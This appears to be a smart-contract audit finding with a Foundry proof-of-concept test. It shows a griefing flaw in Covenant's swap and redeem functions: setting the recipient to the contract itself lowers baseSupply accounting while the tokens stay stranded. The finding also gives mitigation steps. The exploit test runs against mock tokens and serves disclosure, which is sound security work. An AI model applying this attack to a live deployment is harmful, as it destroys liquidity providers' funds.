  "body": "## Finding description and impact\n\nThe `Covenant.swap` function allows BASE-out transfers to any `to` address without prohibiting `to == address(this)`. When a user swaps synths (e.g., aToken) to BASE with `swapParams.to == address(Covenant)`, the function first reduces the market’s accounted base supply (`ms.baseSupply -= amount + protocolFees`) and only then executes `safeTransfer(to, amount)`. For standard ERC20 tokens, transferring to self results in no net balance change for the contract. As a consequence:\n\n- The on-chain ERC20 balance of the contract remains the same (no tokens actually leave),\n- The internal accounting (`baseSupply`) is decremented by `amount`,\n- The difference becomes “orphaned” tokens in the contract that are not reflected in any market accounting nor in `protocolFeeGrowth`.\n\nThis is a griefing attack that causes immediate, direct economic damage to LPs of the affected market. Liquidity providers lose claims to the orphaned portion of base tokens because `baseSupply` is lowered as if the tokens were paid out, but the tokens never leave the contract and cannot be reclaimed (no sweep/rescue mechanism exists). The attacker does not need to profit; simply setting `to = address(this)` burns LP value by removing it from the claimable accounting while leaving funds stranded in the contract.\n\nThe same root cause pattern exists in `redeem` (BASE-out to `redeemParams.to`), so the griefing effect is reproducible via both BASE-out paths.\n\n## Recommended mitigation steps\n\n- Reject transfers to the Covenant core contract address in BASE-out paths:\n  - Add `require(params.to != address(this))` (or a specific protocol error) to `ValidationLogic.checkSwapParams` and `ValidationLogic.checkRedeemParams`, or\n  - Add an explicit guard inside `Covenant.swap` and `Covenant.redeem` prior to the BASE-out transfer.\n- Optionally, disallow `mint.to == address(this)` for consistency and to avoid future UX pitfalls.\n- Consider a controlled rescue/sweep mechanism (governance-gated) to reaccount or reclaim any previously orphaned funds if such state may already exist.",
  "proof_of_concept": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity ^0.8.30;\n\nimport \"forge-std/Test.sol\";\n\nimport {Covenant, MarketId, MarketParams, MarketState, SynthTokens} from \"../../src/Covenant.sol\";\nimport {LatentSwapLEX} from \"../../src/lex/latentswap/LatentSwapLEX.sol\";\nimport {FixedPoint} from \"../../src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {LatentSwapLib} from \"../../src/periphery/libraries/LatentSwapLib.sol\";\nimport {MockOracle} from \"../mocks/MockOracle.sol\";\nimport {MockERC20} from \"../mocks/MockERC20.sol\";\nimport {ILiquidExchangeModel} from \"../../src/interfaces/ILiquidExchangeModel.sol\";\nimport {AssetType, SwapParams, MintParams} from \"../../src/interfaces/ICovenant.sol\";\nimport {IERC20} from \"@openzeppelin/token/ERC20/IERC20.sol\";\n\ncontract CovenantIssue30SelfTransferTest is Test {\n    // LatentSwapLEX configuration constants (mirrors core tests)\n    uint160 internal constant P_MAX = uint160((1095445 * FixedPoint.Q96) / 1000000);\n    uint160 internal constant P_MIN = uint160(FixedPoint.Q192 / P_MAX);\n    uint32 internal constant DURATION = 30 days;\n    uint8 internal constant SWAP_FEE = 0;\n    int64 internal constant LN_RATE_BIAS = 5012540000000000; // WAD\n\n    uint256 internal constant LP_BASE_DEPOSIT = 1_000e18;\n\n    address internal constant LP = address(0xBEEF);\n    address internal constant ATTACKER = address(0xA11CE);\n\n    uint160 internal pLimHigh;\n    uint160 internal pLimMax;\n\n    Covenant internal covenant;\n    LatentSwapLEX internal lex;\n    MockOracle internal oracle;\n    MockERC20 internal baseToken;\n    MockERC20 internal quoteToken;\n\n    MarketId internal marketId;\n    MarketParams internal marketParams;\n    SynthTokens internal synthTokens;\n\n    function setUp() public {\n        pLimHigh = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);\n        pLimMax = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);\n\n        oracle = new MockOracle(address(this));\n        baseToken = new MockERC20(address(this), \"MockBaseAsset\", \"MBA\", 18);\n        quoteToken = new MockERC20(address(this), \"MockQuoteAsset\", \"MQA\", 18);\n\n        // Seed LP with base liquidity that will back the market\n        baseToken.mint(LP, LP_BASE_DEPOSIT);\n\n        covenant = new Covenant(address(this));\n        lex = new LatentSwapLEX(\n            address(this),\n            address(covenant),\n            P_MAX,\n            P_MIN,\n            pLimHigh,\n            pLimMax,\n            LN_RATE_BIAS,\n            DURATION,\n            SWAP_FEE\n        );\n\n        covenant.setEnabledLEX(address(lex), true);\n        covenant.setEnabledCurator(address(oracle), true);\n\n        marketParams = MarketParams({\n            baseToken: address(baseToken),\n            quoteToken: address(quoteToken),\n            curator: address(oracle),\n            lex: address(lex)\n        });\n\n        marketId = covenant.createMarket(marketParams, hex\"\");\n        synthTokens = ILiquidExchangeModel(marketParams.lex).getSynthTokens(marketId);\n    }\n\n    function test_Issue30_SelfTransfer_happy() public {\n        uint256 swapAmount = _prepareAttackerPosition();\n\n        MarketState memory stateBefore = covenant.getMarketState(marketId);\n        uint256 baseBalanceBefore = IERC20(address(baseToken)).balanceOf(address(covenant));\n        assertEq(stateBefore.baseSupply, baseBalanceBefore, \"precondition: baseSupply aligned with balance\");\n\n        SwapParams memory params = SwapParams({\n            marketId: marketId,\n            marketParams: marketParams,\n            assetIn: AssetType.LEVERAGE,\n            assetOut: AssetType.BASE,\n            to: ATTACKER,\n            amountSpecified: swapAmount,\n            amountLimit: 0,\n            isExactIn: true,\n            data: hex\"\",\n            msgValue: 0\n        });\n\n        vm.prank(ATTACKER);\n        uint256 baseOut = covenant.swap(params);\n        assertGt(baseOut, 0, \"expected non-zero base output\");\n\n        MarketState memory stateAfter = covenant.getMarketState(marketId);\n        uint256 baseBalanceAfter = IERC20(address(baseToken)).balanceOf(address(covenant));\n\n        assertEq(stateBefore.baseSupply - stateAfter.baseSupply, baseOut, \"baseSupply should drop by swap output\");\n        assertEq(baseBalanceBefore - baseBalanceAfter, baseOut, \"base balance should drop by swap output\");\n        assertEq(stateAfter.baseSupply, baseBalanceAfter, \"accounting remains consistent when sending externally\");\n        assertEq(IERC20(address(baseToken)).balanceOf(ATTACKER), baseOut, \"attacker receives base tokens\");\n    }\n\n    function test_Issue30_SelfTransfer_bug() public {\n        uint256 swapAmount = _prepareAttackerPosition();\n\n        MarketState memory stateBefore = covenant.getMarketState(marketId);\n        uint256 baseBalanceBefore = IERC20(address(baseToken)).balanceOf(address(covenant));\n        assertEq(stateBefore.baseSupply, baseBalanceBefore, \"precondition: baseSupply aligned with balance\");\n\n        SwapParams memory params = SwapParams({\n            marketId: marketId,\n            marketParams: marketParams,\n            assetIn: AssetType.LEVERAGE,\n            assetOut: AssetType.BASE,\n            to: address(covenant),\n            amountSpecified: swapAmount,\n            amountLimit: 0,\n            isExactIn: true,\n            data: hex\"\",\n            msgValue: 0\n        });\n\n        vm.prank(ATTACKER);\n        uint256 baseOut = covenant.swap(params);\n        assertGt(baseOut, 0, \"expected non-zero base output\");\n\n        MarketState memory stateAfter = covenant.getMarketState(marketId);\n        uint256 baseBalanceAfter = IERC20(address(baseToken)).balanceOf(address(covenant));\n\n        assertEq(stateBefore.baseSupply - stateAfter.baseSupply, baseOut, \"baseSupply still drops by swap output\");\n        assertEq(baseBalanceAfter, baseBalanceBefore, \"base balance remains locked in Covenant\" );\n        assertEq(IERC20(address(baseToken)).balanceOf(ATTACKER), 0, \"attacker receives no base tokens\");\n        assertEq(\n            baseBalanceAfter - stateAfter.baseSupply,\n            baseOut,\n            \"orphaned base tokens equal the stolen accounting share\"\n        );\n    }\n\n    function _prepareAttackerPosition() internal returns (uint256 swapAmount) {\n        (uint256 mintedATokens, ) = _mintFor(LP, LP_BASE_DEPOSIT);\n        assertGt(mintedATokens, 0, \"expected minted aTokens\");\n\n        swapAmount = mintedATokens / 4;\n        if (swapAmount == 0) swapAmount = mintedATokens;\n\n        vm.prank(LP);\n        IERC20(synthTokens.aToken).transfer(ATTACKER, swapAmount);\n    }\n\n    function _mintFor(address user, uint256 amount)\n        internal\n        returns (uint256 aTokenAmountOut, uint256 zTokenAmountOut)\n    {\n        vm.startPrank(user);\n        baseToken.approve(address(covenant), amount);\n        (aTokenAmountOut, zTokenAmountOut) = covenant.mint(\n            MintParams({\n                marketId: marketId,\n                marketParams: marketParams,\n                baseAmountIn: amount,\n                to: user,\n                minATokenAmountOut: 0,\n                minZTokenAmountOut: 0,\n                data: hex\"\",\n                msgValue: 0\n            })\n        );\n        vm.stopPrank();\n    }\n}",
